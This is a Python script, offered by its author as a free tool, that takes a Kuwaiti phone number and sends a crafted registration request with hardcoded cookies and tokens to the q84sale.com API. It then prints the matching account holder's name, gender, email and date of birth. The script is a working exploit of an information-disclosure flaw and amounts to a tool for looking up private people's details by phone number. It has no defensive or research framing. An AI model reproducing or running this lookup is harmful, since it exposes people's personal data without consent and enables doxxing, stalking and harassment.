
#
# This Is Free Tool By Mr. Lyrica Alanzi AKA @8Y
# Dont Try Sell It Cuz It's Fucking Free
# Github: https://github.com/Soud69
# Instagram: https://instagram.com/8Y
# Telegram: https://t.me/Soud69
# Discord: Soud#5866
#

try:
	import os, requests, colorama, json
	from os import system
	from colorama import Fore
	system("title " + "Lyrica Was Here - @8Y - Soud#5866")
except Exception as m:
	print("Something Went Wrong\n")
	print(m)
	input()
	exit()

logo = """
         _______   __ 
   ____ |  _  \ \ / /
  / __ \ \ V / \ V /
 / / _` |/ _ \  \ /
| | (_| | |_| | | |
 \ \__,_\_____/ \_/
  \____/
"""
print(Fore.CYAN+logo)
print(Fore.GREEN+"Made with Love by @8Y - Soud#5866\n\n"+Fore.RESET)

info = f'{{"request":"V4/Users/register","phone":"{input("Enter Phone Number (Kuwait): ")}","region_id":"1","device_info":"","app_version":"1.0","device_type":"web","os":"os_version", "_xyzW": "hVCzjZ4RWLrRDt0k76s1625976512000ifLRiN4SZuRubjn5SEa", "site": "4sale","timestamp":"1625119008"}}'
base = requests.post("https://amp.base64encode.org/?__amp_source_origin=https%3A%2F%2Famp.base64encode.org",data={"input":info,"charset":"UTF-8","separator":"lf"}).text
data = f"{json.loads(base)['output']}:b8e7778c1d47373dcb2ea78bfecf55acf38b0759"
head = {"Host":"www.q84sale.com","Content-Type":"application/json","Origin":"https://www.q84sale.com","Accept-Encoding":"gzip, deflate, br","Cookie":"_xyzW=FlZJdNY0EsbnjkwY7EK1625976638166aEgd0lm887fXWcc8dyH; amp_ea353a_q84sale.com=bXj9s-6Vk8qwaY3eJgTxfM...1fa9s4vrc.1fa9s52mi.3.1.4; qrcode=FlZJdNY0EsbnjkwY7EK1625976638166aEgd0lm887fXWcc8dyH; amp_ea353a=bXj9s-6Vk8qwaY3eJgTxfM...1fa9s4vrc.1fa9s4vri.1.1.2; lastPath=/; next-i18next=en","Connection":"keep-alive","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5","Referer":"https://www.q84sale.com/auth","Content-Length":373,"Accept-Language":"en-us"}
req = requests.post("https://www.q84sale.com/p/index.php/V4/Users/register",data=data,headers=head).text
try:
	w = json.loads(req)["response"]["profile"]
	print(f'''
	{Fore.GREEN}
==================================={Fore.RESET}
Name: {w["first_name"]} {w["last_name"]}
Gen: {w["gender"]}
Email: {w["email"]}
DOB: {w["dob"]}''')
except:
	print(Fore.RED+"No Info Found!")
input()
